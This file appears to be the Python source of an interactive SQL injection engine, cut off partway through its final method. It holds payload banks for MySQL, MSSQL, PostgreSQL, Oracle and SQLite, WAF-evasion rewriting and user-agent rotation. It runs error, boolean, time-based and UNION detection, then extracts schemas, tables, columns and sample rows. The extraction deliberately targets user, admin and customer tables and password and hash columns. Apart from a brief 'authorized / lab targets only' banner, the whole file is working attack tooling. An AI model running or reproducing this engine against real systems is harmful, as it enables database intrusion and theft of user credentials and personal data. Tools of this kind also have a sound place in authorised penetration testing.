#!/usr/bin/env python3
"""
XOMLSX SQLi Engine — detection, fingerprint, extraction suite.
Authorized / lab targets only.
"""
from __future__ import annotations

import hashlib
import json
import os
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, quote, urlencode, urlparse, urlunparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[!] requests required: pip install requests")
    sys.exit(1)

try:
    from core_utils import (
        C,
        normalize_url,
        pause,
        print_finding,
        reports_dir,
        save_json_report,
        save_text_report,
        session as cu_session,
    )
except Exception:
    class C:
        R = "\033[0m"; B = "\033[1m"; DIM = "\033[2m"
        RED = "\033[91m"; GREEN = "\033[92m"; YEL = "\033[93m"
        CYN = "\033[96m"; WHT = "\033[97m"
        GOLD = "\033[38;2;255;215;0m"; NEON = "\033[38;2;0;255;213m"
        PURP = "\033[38;2;191;64;255m"; GRAY = "\033[38;2;110;110;120m"
        AQUA = "\033[38;2;0;255;213m"; CRIM = "\033[38;2;220;20;60m"
        LIME = "\033[38;2;180;255;0m"

    def normalize_url(u: str) -> str:
        u = (u or "").strip()
        if u and not u.startswith(("http://", "https://")):
            u = "http://" + u
        return u

    def pause():
        try:
            input("\n[Press Enter]")
        except EOFError:
            pass

    def reports_dir() -> str:
        d = os.path.join(os.path.dirname(os.path.abspath(__file__)), "reports")
        os.makedirs(d, exist_ok=True)
        return d

    def save_json_report(name: str, data: Any) -> str:
        path = os.path.join(reports_dir(), f"{name}_{int(time.time())}.json")
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        return path

    def save_text_report(name: str, title: str, lines: List[str]) -> str:
        path = os.path.join(reports_dir(), f"{name}_{int(time.time())}.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"{title}\n\n")
            for line in lines:
                f.write(line + "\n")
        return path

    def print_finding(kind, detail, evidence="", severity="med"):
        print(f"[!] {kind}: {detail}")


# ── UI ───────────────────────────────────────────────────────────────────────
def clear():
    os.system("cls" if os.name == "nt" else "clear")


def box(title: str, rows: List[Tuple[str, str]], width: int = 64) -> None:
    print(f"{C.GOLD}+{'-' * width}+{C.R}")
    if title:
        print(f"{C.GOLD}|{C.R}  {C.B}{title}{C.R}")
        print(f"{C.GOLD}+{'-' * width}+{C.R}")
    for k, v in rows:
        print(f"{C.GOLD}|{C.R}  {C.GOLD}{k}{C.R}  {v}")
    print(f"{C.GOLD}+{'-' * width}+{C.R}")


def prompt(label: str, default: str = "") -> str:
    suf = f" {C.GRAY}[{default}]{C.R}" if default else ""
    try:
        v = input(f"{C.AQUA}{label}{C.R}{suf}: ").strip()
    except EOFError:
        return default
    return v or default


def yn(label: str, default: bool = False) -> bool:
    d = "y" if default else "n"
    return prompt(f"{label} (y/n)", d).lower().startswith("y")


def status(msg: str, kind: str = "info") -> None:
    m = {"ok": (C.GREEN, "[+]"), "err": (C.CRIM, "[!]"), "warn": (C.YEL, "[~]"),
         "info": (C.CYN, "[*]"), "hit": (C.LIME, "[!]")}
    c, t = m.get(kind, (C.CYN, "[*]"))
    print(f"  {c}{t} {msg}{C.R}")


def banner():
    clear()
    print(f"""
{C.CRIM}{C.B}  ███████╗ ██████╗ ██╗     ██╗
  ██╔════╝██╔═══██╗██║     ██║
  ███████╗██║   ██║██║     ██║
  ╚════██║██║▄▄ ██║██║     ██║
  ███████║╚██████╔╝███████╗██║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝{C.R}
{C.GOLD}{C.B}     SQL Injection Engine  ·  detect · fingerprint · extract{C.R}
{C.GRAY}     authorized / lab targets only{C.R}
""")


# ── DBMS signatures ──────────────────────────────────────────────────────────
ERROR_SIGNATURES: Dict[str, List[str]] = {
    "mysql": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
        r"valid MySQL result", r"check the manual that corresponds to your MySQL",
        r"MySqlClient\.", r"com\.mysql\.jdbc", r"mysqli?_", r"MariaDB",
        r"You have an error in your SQL syntax",
    ],
    "mssql": [
        r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server", r"SQLServer JDBC Driver",
        r"SqlException", r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Native Client", r"ODBC SQL Server Driver",
        r"\[SQL Server\]", r"Incorrect syntax near",
    ],
    "oracle": [
        r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver", r"quoted string not properly terminated",
        r"SQL command not properly ended", r"oracle\.jdbc",
    ],
    "postgres": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::", r"psql:", r"ERROR:\s+syntax error at or near",
    ],
    "sqlite": [
        r"SQLite\/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.",
        r"Warning.*sqlite_", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]",
        r"unrecognized token:", r"SQLITE_ERROR",
    ],
}

DBMS_VERSION_PAYLOADS = {
    "mysql": [
        ("error", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -"),
        ("error", "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -"),
        ("union", "' UNION SELECT NULL,VERSION(),NULL-- -"),
    ],
    "mssql": [
        ("error", "' AND 1=CONVERT(int,@@version)--"),
        ("union", "' UNION SELECT NULL,@@version,NULL--"),
    ],
    "postgres": [
        ("error", "' AND 1=CAST(version() AS int)--"),
        ("union", "' UNION SELECT NULL,version(),NULL--"),
    ],
    "oracle": [
        ("union", "' UNION SELECT NULL,banner,NULL FROM v$version--"),
    ],
    "sqlite": [
        ("union", "' UNION SELECT NULL,sqlite_version(),NULL--"),
    ],
}


# ── payload banks ────────────────────────────────────────────────────────────
def _u(s: str) -> str:
    """URL-encode selective chars for WAF-ish forms."""
    return s


DETECT_PAYLOADS = [
    # classic
    ("quote", "'"),
    ("quote-d", "\""),
    ("quote-escape", "\\'"),
    ("logic-true", "' OR '1'='1"),
    ("logic-false", "' OR '1'='2"),
    ("logic-true-int", "1 OR 1=1"),
    ("logic-false-int", "1 AND 1=2"),
    ("comment-mysql", "' OR 1=1-- -"),
    ("comment-hash", "' OR 1=1#"),
    ("comment-mssql", "' OR 1=1--"),
    ("stacked", "'; SELECT 1-- -"),
    ("paren", "') OR ('1'='1"),
    ("paren2", "\") OR (\"1\"=\"1"),
    # bypass / modern
    ("inline-comment", "'/**/OR/**/1=1-- -"),
    ("case-mix", "' oR '1'='1"),
    ("null-byte", "%00'"),
    ("double-encode", "%2527"),
    ("unicode", "%u0027"),
    ("scientific", "1e0 OR 1=1"),
    ("hex-true", "0x31 OR 1=1"),
    ("concat-bypass", "' OR CONCAT('1','1')='11'-- -"),
    ("like-true", "' OR 'a' LIKE 'a"),
    ("rlike", "' OR 'a' RLIKE 'a"),
    ("regexp", "' OR 'a' REGEXP 'a"),
    ("between", "1 OR 1 BETWEEN 0 AND 2"),
    ("is-null", "' OR 1 IS NOT NULL-- -"),
    ("not-false", "' OR NOT 0-- -"),
    ("xor", "' OR 1 XOR 0-- -"),
    ("and-true", "' AND '1'='1"),
    ("and-false", "' AND '1'='2"),
]

TIME_PAYLOADS = {
    "mysql": [
        ("sleep", "' AND SLEEP({d})-- -"),
        ("sleep-paren", "') AND SLEEP({d})-- -"),
        ("benchmark", "' AND BENCHMARK(20000000,SHA1('xom'))-- -"),
        ("if-sleep", "' AND IF(1=1,SLEEP({d}),0)-- -"),
    ],
    "mssql": [
        ("waitfor", "'; WAITFOR DELAY '0:0:{d}'--"),
        ("if-wait", "'; IF 1=1 WAITFOR DELAY '0:0:{d}'--"),
    ],
    "postgres": [
        ("pg-sleep", "' AND pg_sleep({d})-- -"),
        ("case-sleep", "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep({d}) ELSE pg_sleep(0) END)-- -"),
    ],
    "oracle": [
        ("dbms-pipe", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{d})=1--"),
    ],
    "sqlite": [
        ("heavy", "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -"),
    ],
}

UNION_NULL_PROBE = "' UNION SELECT {cols}-- -"
UNION_ORDER = "' ORDER BY {n}-- -"

# extraction templates per DBMS (string-context with leading quote)
EXTRACT = {
    "mysql": {
        "version": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        "user": "' AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))-- -",
        "database": "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))-- -",
        "dbs_count": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*) FROM information_schema.schemata)))-- -",
        "db_name": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT {i},1)))-- -",
        "tables_count": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())))-- -",
        "table_name": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {i},1)))-- -",
        "cols_count": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table}')))-- -",
        "col_name": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table}' LIMIT {i},1)))-- -",
        "row_count": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*) FROM `{table}`)))-- -",
        "cell": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT `{col}` FROM `{table}` LIMIT {i},1)))-- -",
        "union_version": "' UNION SELECT {cols}-- -",
        "blind_len": "' AND IF(LENGTH(DATABASE())={n},SLEEP({d}),0)-- -",
        "blind_char": "' AND IF(ASCII(SUBSTR(DATABASE(),{pos},1))={code},SLEEP({d}),0)-- -",
    },
    "mssql": {
        "version": "' AND 1=CONVERT(int,@@version)--",
        "user": "' AND 1=CONVERT(int,SYSTEM_USER)--",
        "database": "' AND 1=CONVERT(int,DB_NAME())--",
        "table_name": "'; SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP {i} table_name FROM information_schema.tables)--",
    },
    "postgres": {
        "version": "' AND 1=CAST(version() AS int)--",
        "user": "' AND 1=CAST(current_user AS int)--",
        "database": "' AND 1=CAST(current_database() AS int)--",
    },
    "sqlite": {
        "version": "' UNION SELECT NULL,sqlite_version(),NULL--",
        "tables": "' UNION SELECT NULL,group_concat(name),NULL FROM sqlite_master WHERE type='table'--",
    },
    "oracle": {
        "version": "' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--",
    },
}

WAF_EVASION_WRAPPERS = [
    lambda p: p,
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.replace(" ", "%09"),
    lambda p: p.replace(" ", "%0a"),
    lambda p: p.replace("OR", "oR").replace("AND", "aNd") if "OR" in p or "AND" in p else p,
    lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),
    lambda p: p.replace("'", "%27"),
    lambda p: p.replace(" ", "+"),
]


# ── HTTP core ────────────────────────────────────────────────────────────────
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]


@dataclass
class ProbeResult:
    param: str
    technique: str
    payload: str
    evidence: str
    severity: str
    dbms: Optional[str] = None
    status: int = 0
    length: int = 0
    time_s: float = 0.0
    url: str = ""


@dataclass
class EngineState:
    url: str
    method: str = "GET"
    data: Dict[str, str] = field(default_factory=dict)
    params: List[str] = field(default_factory=list)
    orig: Dict[str, str] = field(default_factory=dict)  # original param values
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    timeout: float = 12.0
    delay: float = 0.05
    threads: int = 6
    time_threshold: float = 4.5
    sleep_s: int = 5
    findings: List[ProbeResult] = field(default_factory=list)
    dbms: Optional[str] = None
    injectable: List[str] = field(default_factory=list)
    baseline_len: int = 0
    baseline_hash: str = ""
    baseline_time: float = 0.0
    union_cols: int = 0
    extracted: Dict[str, Any] = field(default_factory=dict)


def params_of(url: str) -> List[str]:
    return list(parse_qs(urlparse(url).query, keep_blank_values=True).keys())


def inject(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(qs, doseq=True), p.fragment))


def ensure_params(url: str, method: str, data: Dict[str, str]) -> Tuple[str, List[str], Dict[str, str]]:
    method = method.upper()
    data = dict(data or {})
    if method == "GET":
        ps = params_of(url)
        if not ps:
            join = "&" if "?" in url else "?"
            url = url + join + "id=1"
            ps = ["id"]
            status("no query params — seeded ?id=1", "warn")
        return url, ps, data
    if not data:
        data = {"id": "1"}
        status("no POST body — using id=1", "warn")
    return url, list(data.keys()), data


def parse_body(raw: str) -> Dict[str, str]:
    raw = (raw or "").strip()
    if not raw:
        return {}
    if raw.startswith("{"):
        try:
            return {str(k): str(v) for k, v in json.loads(raw).items()}
        except Exception:
            pass
    out = {}
    for part in raw.split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
            out[k.strip()] = v.strip()
        elif part.strip():
            out[part.strip()] = ""
    return out


class Http:
    def __init__(self, st: EngineState):
        self.st = st
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({"User-Agent": random.choice(UA)})
        if st.headers:
            self.s.headers.update(st.headers)
        if st.cookies:
            self.s.cookies.update(st.cookies)
        self._lock = threading.Lock()
        self._last = 0.0

    def _rate(self):
        with self._lock:
            now = time.monotonic()
            slot = max(now, self._last + self.st.delay)
            self._last = slot
        w = slot - time.monotonic()
        if w > 0:
            time.sleep(w)

    def request(self, param: str, value: str, *, replace: bool = False) -> Tuple[Optional[Any], float, str]:
        """Inject value. Supports query/body params plus cookie:X and header:X."""
        self._rate()
        t0 = time.monotonic()
        orig = self.st.orig.get(param, "")
        if not orig:
            if param.startswith("cookie:"):
                orig = self.st.cookies.get(param.split(":", 1)[1], "1")
            elif param.startswith("header:"):
                orig = self.st.headers.get(param.split(":", 1)[1], "1")
            else:
                orig = self.st.data.get(param, "1")
        final = value if replace else (str(orig) + value)
        try:
            cookies = dict(self.st.cookies)
            headers = dict(self.st.headers)
            if param.startswith("cookie:"):
                ck = param.split(":", 1)[1]
                cookies[ck] = final
                if self.st.method == "GET":
                    r = self.s.get(self.st.url, timeout=self.st.timeout, allow_redirects=True,
                                   cookies=cookies, headers=headers)
                else:
                    r = self.s.post(self.st.url, data=self.st.data, timeout=self.st.timeout,
                                    allow_redirects=True, cookies=cookies, headers=headers)
                return r, time.monotonic() - t0, self.st.url
            if param.startswith("header:"):
                hk = param.split(":", 1)[1]
                headers[hk] = final
                if self.st.method == "GET":
                    r = self.s.get(self.st.url, timeout=self.st.timeout, allow_redirects=True,
                                   cookies=cookies, headers=headers)
                else:
                    r = self.s.post(self.st.url, data=self.st.data, timeout=self.st.timeout,
                                    allow_redirects=True, cookies=cookies, headers=headers)
                return r, time.monotonic() - t0, self.st.url
            if self.st.method == "GET":
                url = inject(self.st.url, param, final)
                r = self.s.get(url, timeout=self.st.timeout, allow_redirects=True,
                               cookies=cookies, headers=headers)
                return r, time.monotonic() - t0, url
            body = dict(self.st.data)
            body[param] = final
            r = self.s.post(self.st.url, data=body, timeout=self.st.timeout, allow_redirects=True,
                            cookies=cookies, headers=headers)
            return r, time.monotonic() - t0, self.st.url
        except Exception:
            return None, time.monotonic() - t0, self.st.url


def body_hash(text: str) -> str:
    # strip volatile bits
    t = re.sub(r"\d{10,}", "", text or "")
    t = re.sub(r"csrf[_-]?token[\"'=\s:]+[\w\-]+", "", t, flags=re.I)
    return hashlib.md5(t.encode("utf-8", errors="ignore")).hexdigest()


def detect_dbms_from_body(text: str) -> Optional[str]:
    for dbms, sigs in ERROR_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, text or "", re.I):
                return dbms
    return None


def extract_between_tildes(text: str) -> List[str]:
    return re.findall(r"~([^~<\n\r]{1,200})", text or "")


# ── engine stages ────────────────────────────────────────────────────────────
class SQLiEngine:
    def __init__(self, st: EngineState):
        self.st = st
        self.http = Http(st)

    def baseline(self) -> None:
        # capture original values for every param
        qs = parse_qs(urlparse(self.st.url).query, keep_blank_values=True)
        for p in self.st.params:
            if p.startswith("cookie:"):
                self.st.orig[p] = self.st.cookies.get(p.split(":", 1)[1], "1")
            elif p.startswith("header:"):
                self.st.orig[p] = self.st.headers.get(p.split(":", 1)[1], "1")
            elif self.st.method == "GET":
                self.st.orig[p] = (qs.get(p) or ["1"])[0]
            else:
                self.st.orig[p] = self.st.data.get(p, "1")
        param = self.st.params[0]
        times, lengths, hashes = [], [], []
        for _ in range(3):
            # empty append == original value
            r, dt, _ = self.http.request(param, "")
            if r is not None:
                times.append(dt)
                lengths.append(len(r.content or b""))
                hashes.append(body_hash(r.text or ""))
        if times:
            self.st.baseline_time = sum(times) / len(times)
            self.st.baseline_len = int(sum(lengths) / len(lengths))
            self.st.baseline_hash = max(set(hashes), key=hashes.count) if hashes else ""
        status(
            f"baseline time={self.st.baseline_time:.2f}s len={self.st.baseline_len} hash={self.st.baseline_hash[:8]}",
            "info",
        )

    def _add(self, pr: ProbeResult) -> None:
        self.st.findings.append(pr)
        if pr.param not in self.st.injectable:
            self.st.injectable.append(pr.param)
        if pr.dbms and not self.st.dbms:
            self.st.dbms = pr.dbms
        color = C.CRIM if pr.severity == "critical" else C.LIME if pr.severity == "high" else C.YEL
        print(f"  {color}{C.B}[{pr.severity}]{C.R} {pr.technique} · {pr.param}")
        print(f"    {C.GRAY}{pr.payload[:110]}{C.R}")
        if pr.evidence:
            print(f"    {C.DIM}{pr.evidence[:120]}{C.R}")

    def stage_error_boolean(self) -> None:
        status("stage: error / boolean detection", "info")
        # --- error-based (single shot) ---
        replace_tags = {"double-encode", "unicode", "null-byte", "hex-true", "scientific"}
        for param in self.st.params:
            for tag, payload in DETECT_PAYLOADS:
                r, dt, url = self.http.request(param, payload, replace=(tag in replace_tags))
                if r is None:
                    continue
                text = r.text or ""
                dbms = detect_dbms_from_body(text)
                if not dbms:
                    continue
                evidence = ""
                for sig in ERROR_SIGNATURES[dbms]:
                    m = re.search(sig, text, re.I)
                    if m:
                        evidence = m.group(0)[:160]
                        break
                self._add(ProbeResult(
                    param=param, technique=f"error-{tag}", payload=payload,
                    evidence=evidence or dbms, severity="high", dbms=dbms,
                    status=r.status_code, length=len(r.content or b""), time_s=dt, url=url,
                ))
                break  # one solid error hit per param is enough to mark injectable

        # --- boolean true/false pairs (sqlmap-style confirmation) ---
        pairs = [
            ("' OR '1'='1", "' OR '1'='2"),
            ("' AND '1'='1", "' AND '1'='2"),
            ("1 OR 1=1", "1 AND 1=2"),
            ("' OR 1=1-- -", "' OR 1=2-- -"),
            ("' OR 'a'='a", "' OR 'a'='b"),
            ("') OR ('1'='1", "') OR ('1'='2"),
        ]
        for param in self.st.params:
            for true_p, false_p in pairs:
                r_t, _, url_t = self.http.request(param, true_p)
                r_f, _, url_f = self.http.request(param, false_p)
                if r_t is None or r_f is None:
                    continue
                ht, hf = body_hash(r_t.text or ""), body_hash(r_f.text or "")
                lt, lf = len(r_t.content or b""), len(r_f.content or b"")
                # true and false must differ from each other
                if ht == hf and abs(lt - lf) < 15:
                    continue
                # at least one should differ from baseline
                if self.st.baseline_hash and ht == self.st.baseline_hash and hf == self.st.baseline_hash:
                    continue
                self._add(ProbeResult(
                    param=param, technique="boolean-pair",
                    payload=f"TRUE:{true_p} | FALSE:{false_p}",
                    evidence=f"true_len={lt} false_len={lf} hash_diff={ht!=hf}",
                    severity="high", dbms=self.st.dbms, status=r_t.status_code,
                    length=lt, url=url_t,
                ))
                break

    def stage_time(self, exhaust: bool = False) -> None:
        status(f"stage: time-based blind (sleep={self.st.sleep_s}s, threshold={self.st.time_threshold}s)", "info")
        dbms_list = list(TIME_PAYLOADS.keys()) if exhaust or not self.st.dbms else [self.st.dbms]
        for dbms in dbms_list:
            for tag, tmpl in TIME_PAYLOADS.get(dbms, []):
                payload = tmpl.format(d=self.st.sleep_s)
                for param in self.st.params:
                    hits = 0
                    times = []
                    url = ""
                    r = None
                    for _ in range(3):
                        r, dt, url = self.http.request(param, payload)
                        times.append(dt)
                        if dt >= self.st.time_threshold:
                            hits += 1
                    if hits >= 2:
                        self._add(ProbeResult(
                            param=param, technique=f"time-{dbms}-{tag}", payload=payload,
                            evidence=f"confirm={hits}/3 times={[round(t,2) for t in times]} base={self.st.baseline_time:.2f}s",
                            severity="high", dbms=dbms, status=getattr(r, "status_code", 0) or 0,
                            length=len(getattr(r, "content", b"") or b""), time_s=max(times), url=url,
                        ))
                        if not self.st.dbms:
                            self.st.dbms = dbms
                        if not exhaust:
                            return  # one confirmed time channel is enough

    def stage_union(self) -> None:
        status("stage: UNION column enumeration", "info")
        params = self.st.injectable or self.st.params
        max_cols = 12
        for param in params:
            # ORDER BY
            cols = 0
            for n in range(1, max_cols + 1):
                payload = UNION_ORDER.format(n=n)
                r, _, url = self.http.request(param, payload)
                if r is None:
                    break
                text = (r.text or "").lower()
                # error on order by often means too many columns
                if re.search(r"unknown column|order by|out of range|sql", text, re.I) and n > 1:
                    if body_hash(r.text or "") != self.st.baseline_hash:
                        cols = n - 1
                        break
                cols = n
            if cols <= 0:
                # try null count method
                for n in range(1, max_cols + 1):
                    nulls = ",".join(["NULL"] * n)
                    payload = UNION_NULL_PROBE.format(cols=nulls)
                    r, _, url = self.http.request(param, payload)
                    if r is None:
                        continue
                    if r.status_code == 200 and "error" not in (r.text or "").lower()[:500]:
                        # soft accept when no sql error keywords
                        if not detect_dbms_from_body(r.text or ""):
                            cols = n
                            self._add(ProbeResult(
                                param=param, technique="union-cols", payload=payload,
                                evidence=f"union accepted with {n} cols", severity="high",
                                dbms=self.st.dbms, status=r.status_code,
                                length=len(r.content or b""), url=url,
                            ))
                            break
            if cols > 0:
                self.st.union_cols = max(self.st.union_cols, cols)
                status(f"UNION columns ≈ {cols} (param={param})", "ok")
                # version via union if possible
                if cols >= 1:
                    # random markers (sqlmap-style) so page scrape is unambiguous
                    mk = "xom" + "".join(random.choices(string.ascii_lowercase, k=4))
                    expr = {
                        "mysql": "VERSION()",
                        "mssql": "@@version",
                        "postgres": "version()",
                        "sqlite": "sqlite_version()",
                        "oracle": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
                    }.get(self.st.dbms or "mysql", "VERSION()")
                    positions = ["NULL"] * cols
                    positions[min(1, cols - 1)] = f"CONCAT('{mk}',{expr},'{mk}')"
                    if (self.st.dbms or "mysql") == "mssql":
                        positions[min(1, cols - 1)] = f"'{mk}'+CAST({expr} AS varchar(200))+'{mk}'"
                    if self.st.dbms == "postgres":
                        positions[min(1, cols - 1)] = f"'{mk}'||{expr}||'{mk}'"
                    payload = f"' UNION SELECT {','.join(positions)}-- -"
                    r, _, url = self.http.request(param, payload)
                    if r and r.text:
                        m = re.search(re.escape(mk) + r"(.+?)" + re.escape(mk), r.text, re.S)
                        if m:
                            ver = m.group(1).strip()[:120]
                            self.st.extracted["version"] = ver
                            self._add(ProbeResult(
                                param=param, technique="union-version", payload=payload,
                                evidence=ver, severity="critical",
                                dbms=self.st.dbms, status=r.status_code, url=url,
                            ))

    def stage_fingerprint(self) -> None:
        status("stage: DBMS fingerprint / banner", "info")
        if self.st.dbms:
            status(f"dbms hint: {self.st.dbms}", "ok")
        params = self.st.injectable or self.st.params
        targets = [self.st.dbms] if self.st.dbms else list(DBMS_VERSION_PAYLOADS.keys())
        for dbms in targets:
            for kind, payload in DBMS_VERSION_PAYLOADS.get(dbms, []):
                for param in params:
                    r, dt, url = self.http.request(param, payload)
                    if r is None:
                        continue
                    text = r.text or ""
                    found = detect_dbms_from_body(text) or dbms
                    tildes = extract_between_tildes(text)
                    evidence = tildes[0] if tildes else ""
                    if not evidence:
                        m = re.search(r"(ORA-\d{5}|SQL syntax|PostgreSQL|SQLite|Microsoft SQL Server[^\n<]+)", text, re.I)
                        if m:
                            evidence = m.group(0)[:160]
                    if tildes or detect_dbms_from_body(text):
                        self.st.dbms = found
                        if tildes:
                            self.st.extracted.setdefault("banner", tildes[0])
                        self._add(ProbeResult(
                            param=param, technique=f"fingerprint-{kind}", payload=payload,
                            evidence=evidence or found, severity="high", dbms=found,
                            status=r.status_code, time_s=dt, url=url,
                        ))
                        return

    def stage_extract_mysql_error(self) -> None:
        """Error-based extraction for MySQL/MariaDB via EXTRACTVALUE."""
        if self.st.dbms not in ("mysql", None):
            return
        status("stage: MySQL error-based extraction", "info")
        param = (self.st.injectable or self.st.params)[0]
        tpl = EXTRACT["mysql"]

        def pull(payload: str) -> Optional[str]:
            r, _, _ = self.http.request(param, payload)
            if not r:
                return None
            tildes = extract_between_tildes(r.text or "")
            if tildes:
                return tildes[0]
            # XPATH syntax error: '~data'
            m = re.search(r"XPATH syntax error:\s*'~([^']*)'", r.text or "", re.I)
            if m:
                return m.group(1)
            return None

        for key in ("version", "user", "database"):
            val = pull(tpl[key])
            if val:
                self.st.extracted[key] = val
                status(f"{key} = {val}", "hit")

        # databases
        dbs = []
        for i in range(0, 12):
            val = pull(tpl["db_name"].format(i=i))
            if not val:
                break
            dbs.append(val)
            status(f"schema[{i}] = {val}", "ok")
        if dbs:
            self.st.extracted["schemata"] = dbs

        # tables in current db
        tables = []
        for i in range(0, 20):
            val = pull(tpl["table_name"].format(i=i))
            if not val:
                break
            tables.append(val)
            status(f"table[{i}] = {val}", "ok")
        if tables:
            self.st.extracted["tables"] = tables

        # columns for first few tables
        columns: Dict[str, List[str]] = {}
        for table in tables[:8]:
            cols = []
            for i in range(0, 15):
                val = pull(tpl["col_name"].format(table=table, i=i))
                if not val:
                    break
                cols.append(val)
            if cols:
                columns[table] = cols
                status(f"{table} cols = {', '.join(cols)}", "ok")
        if columns:
            self.st.extracted["columns"] = columns

        # sample rows for interesting tables
        interesting = [t for t in tables if re.search(r"user|admin|account|member|login|customer|auth", t, re.I)]
        interesting = interesting or tables[:2]
        rows: Dict[str, List[Dict[str, str]]] = {}
        for table in interesting[:3]:
            cols = columns.get(table) or []
            prefer = [c for c in cols if re.search(r"id|user|name|mail|pass|hash|phone", c, re.I)]
            prefer = (prefer or cols)[:4]
            table_rows = []
            for i in range(0, 5):
                row = {}
                for col in prefer:
                    val = pull(tpl["cell"].format(col=col, table=table, i=i))
                    if val is not None:
                        row[col] = val
                if row:
                    table_rows.append(row)
                    status(f"{table}[{i}] {row}", "hit")
                else:
                    break
            if table_rows:
                rows[table] = table_rows
        if rows:
            self.st.extracted["rows"] = rows

    def stage_extract_blind_mysql(self) -> None:
        """Time-based blind extraction of DATABASE() — binary search per char (sqlmap-like)."""
        if self.st.dbms not in ("mysql", None):
            return
        if not any(f.technique.startswith("time-") for f in self.st.findings):
            return
        status("stage: MySQL time-based blind (binary search)", "info")
        param = (self.st.injectable or self.st.params)[0]
        d = min(self.st.sleep_s, 3)
        thr = self.st.time_threshold * 0.7

        def delayed(payload: str) -> bool:
            _, dt, _ = self.http.request(param, payload)
            return dt >= thr

        # length via binary search 1..32
        lo, hi = 1, 32
        length = 0
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = f"' AND IF(LENGTH(DATABASE())>{mid},SLEEP({d}),0)-- -"
            if delayed(payload):
                lo = mid + 1
            else:
                hi = mid - 1
        length = lo
        if length <= 0 or length > 32:
            status("could not determine length via time", "warn")
            return
        status(f"DATABASE() length ≈ {length}", "ok")

        name = []
        for pos in range(1, length + 1):
            lo, hi = 32, 126  # printable ASCII
            while lo <= hi:
                mid = (lo + hi) // 2
                payload = f"' AND IF(ASCII(SUBSTR(DATABASE(),{pos},1))>{mid},SLEEP({d}),0)-- -"
                if delayed(payload):
                    lo = mid + 1
                else:
                    hi = mid - 1
            name.append(chr(lo) if 32 <= lo <= 126 else "?")
            print(f"\r  {C.LIME}[blind]{C.R} DATABASE() = {''.join(name)}{' ' * 8}", end="", flush=True)
        print()
        if name:
            self.st.extracted["database_blind"] = "".join(name)
            status(f"DATABASE() = {''.join(name)}", "hit")

    def run_full(self) -> None:
        self.baseline()
        self.stage_error_boolean()
        self.stage_time()
        self.stage_fingerprint()
        self.stage_union()
        if self.st.injectable:
            self.stage_extract_mysql_error()
            self.stage_extract_blind_mysql()
        else:
            status("no injectable param confirmed — extraction skipped", "warn")

    def run_detect_only(self) -> None:
        self.baseline()
        self.stage_error_boolean()
        self.stage_time()
        self.stage_fingerprint()

    def run_extract_only(self) -> None:
        self.baseline()
        if not self.st.injectable:
            self.stage_error_boolean()
            self.stage_time()
        self.stage_fingerprint()
        self.stage_union()
        self.stage_extract_mysql_error()
        self.stage_extract_blind_mysql()

    def run_all(self) -> None:
        """Everything: all techniques, all DBMS time banks, extract + blind."""
        status("mode ALL — every technique, no early skip", "info")
        # force multi-dbms time probes even if one dbms already hinted
        saved_dbms = self.st.dbms
        self.st.dbms = None
        self.baseline()
        self.stage_error_boolean()
        self.stage_time(exhaust=True)
